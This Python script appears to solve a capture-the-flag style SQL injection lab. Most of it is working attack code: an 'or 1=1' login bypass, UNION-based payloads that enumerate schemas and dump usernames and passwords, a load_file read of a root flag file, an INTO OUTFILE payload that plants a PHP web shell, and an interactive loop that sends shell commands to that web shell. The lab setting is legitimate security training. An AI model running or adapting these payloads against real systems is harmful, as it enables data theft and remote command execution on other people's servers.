#!/usr/bin/python3

import requests
import sys


def subverting_query_logic():
    # retrieving all data from the requests login
    # using the simple quote to glob the specific user
    # in this sample it's

    # tom' or '1'='1
    # and for the password field, whatever you want.
    response = requests.post(url="http://144.126.228.151:31894/",
                             headers={
                                 "Content-Type": "application/x-www-form-urlencoded"},
                             data={"username": "tom' or '1'='1", "password": "dicks"})
    print(response.text)


def malicious_request():
    """This requests will be used after poisoning if you want to call it
        using the sql injections to include malicious content in webshell
        shell.php
    """
    while True:
        cmd = input("shell#> ")
        value = requests.get(
            url="http://178.62.13.127:31737/dashboard/shell.php?0=" + cmd)
        print(value.text)


def writing_files(payload: str) -> None:
    session = requests.Session()

    # once we have the session we can start attacking

    payload = payload.replace(' ', '+')
    response = session.get(
        url="http://144.126.194.57:31690/search.php?" + payload)
    print(response.text)
    malicious_request()


def skill_assessments():
    url_victim = "http://178.62.13.127:31737/dashboard/dashboard.php"

    # As we could see, the php web application use the search parameter
    # as POST method, so we can use the payload to try to enumerate the values

    # payload = "' union select 1,2,schema_name,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -" => to the the databases
    # payload = "' union select 1,2,table_name,4,5 from INFORMATION_SCHEMA.tables where table_schema='ilfreight'-- -" => to get the tables of the specific database
    # payload = "' union select 1,2,column_name,4,5 from INFORMATION_SCHEMA.columns where table_schema='ilfreight' and table_name='users'-- -" describe <table_name>
    # payload = "' union select 1,2,group_concat(username,0x3a,password),4,5 from users-- -" => enumerating the content of specific table
    # payload = "' union select 1,2,load_file('/root/flag.txt'),4,5-- -"
    payload = "' union select   \"\",\"\",'<?php system($_REQUEST[0]); ?>',\"\", \"\" into outfile '/var/www/html/dashboard/shell.php'-- -"
    print(payload)
    response = requests.post(url=url_victim, data={"search": payload},
                             cookies={"PHPSESSID": "jqr3bcar528ksf2igmfihh7ms4"})
    print(response.text)


def main():
    try:
        # writing_files(payload="port_code=' union select \"\",'<?php system($_REQUEST[0]); ?>',\"\", \"\" into outfile '/var/www/html/shell.php'-- -")
        # skill_assessments()
        malicious_request()
    except Exception as e:
        print(str(e))
        sys.exit(1)

    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit(0)


if __name__ == "__main__":
    main()
